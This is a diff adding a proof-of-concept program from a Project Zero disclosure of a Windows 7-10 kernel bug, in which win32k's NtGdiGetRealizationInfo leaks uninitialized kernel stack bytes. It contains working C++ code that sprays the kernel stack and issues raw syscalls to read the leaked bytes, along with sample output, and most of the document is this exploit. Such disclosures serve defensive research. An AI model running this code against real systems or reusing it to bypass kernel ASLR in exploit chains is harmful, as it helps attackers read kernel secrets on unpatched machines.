@@ -1,0 +1,136 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1181
+
+We have discovered that it is possible to disclose portions of uninitialized kernel stack memory to user-mode applications in Windows 7-10 through the win32k!NtGdiGetRealizationInfo system call.
+
+The concrete layout of the input/output structure is unclear (symbols indicate its name is FONT_REALIZATION_INFO), but the first DWORD field contains the structure size, which can be either 16 or 24. The internal win32k!GreGetRealizationInfo function then initializes a local copy of the structure on the kernel stack with an adequate number of bytes. However, the syscall handler later copies the full 24 bytes of memory back to user-mode, regardless of the declared size of the structure, and the number of bytes initialized within it:
+
+--- cut ---
+.text:BF86F307                 mov     edi, ecx
+.text:BF86F309
+.text:BF86F309 loc_BF86F309:
+.text:BF86F309                 push    6
+.text:BF86F30B                 pop     ecx
+.text:BF86F30C                 lea     esi, [ebp+var_30]
+.text:BF86F30F                 rep movsd
+--- cut ---
+
+In other words, if we pass in a structure with .Size set to 16, the kernel will leak 8 uninitialized stack bytes back to us. This condition is illustrated by the attached proof-of-concept program, which first sprays 1024 bytes of the kernel stack with the 0x41 ('A') value, and then invokes the affected system call. The result of starting the program on Windows 7 32-bit is as follows:
+
+--- cut ---
+00000000: 10 00 00 00 03 01 00 00 2d 00 00 00 65 00 00 46 ........-...e..F
+00000010: 41 41 41 41 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? AAAAAAAA........
+--- cut ---
+
+It is clearly visible that the 8 trailing bytes are set to the leftover 'A's artificially set up to demonstrate the security issue.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+// Own implementation of memset(), which guarantees no data is spilled on the local stack.
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Windows 7 32-bit.
+  CONST ULONG __NR_NtGdiEngCreatePalette = 0x129c;
+
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[1024];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  SystemCall32(__NR_NtGdiEngCreatePalette, 1, sizeof(buffer) / sizeof(DWORD), buffer, 0, 0, 0);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Windows 7 32-bit.
+  CONST ULONG __NR_NtGdiGetRealizationInfo = 0x10cb;
+
+  // Create a Device Context.
+  HDC hdc = CreateCompatibleDC(NULL);
+
+  // Create a TrueType font.
+  HFONT hfont = CreateFont(10,                  // nHeight
+                           10,                  // nWidth
+                           0,                   // nEscapement
+                           0,                   // nOrientation
+                           FW_DONTCARE,         // fnWeight
+                           FALSE,               // fdwItalic
+                           FALSE,               // fdwUnderline
+                           FALSE,               // fdwStrikeOut
+                           ANSI_CHARSET,        // fdwCharSet
+                           OUT_DEFAULT_PRECIS,  // fdwOutputPrecision
+                           CLIP_DEFAULT_PRECIS, // fdwClipPrecision
+                           DEFAULT_QUALITY,     // fdwQuality
+                           FF_DONTCARE,         // fdwPitchAndFamily
+                           L"Times New Roman");
+
+  // Select the font into the DC.
+  SelectObject(hdc, hfont);
+
+  // Spray the kernel stack to get visible results.
+  SprayKernelStack();
+
+  // Read the uninitialized kernel stack bytes and print them on screen.
+  DWORD output[6] = { /* zero padding */ };
+  output[0] = 16;
+
+  if (!SystemCall32(__NR_NtGdiGetRealizationInfo, hdc, output)) {
+    printf("NtGdiGetRealizationInfo failed\n");
+    DeleteObject(hfont);
+    DeleteDC(hdc);
+    return 1;
+  }
+
+  PrintHex((PBYTE)output, sizeof(output));
+
+  // Free resources.
+  DeleteObject(hfont);
+  DeleteDC(hdc);
+
+  return 0;
+}
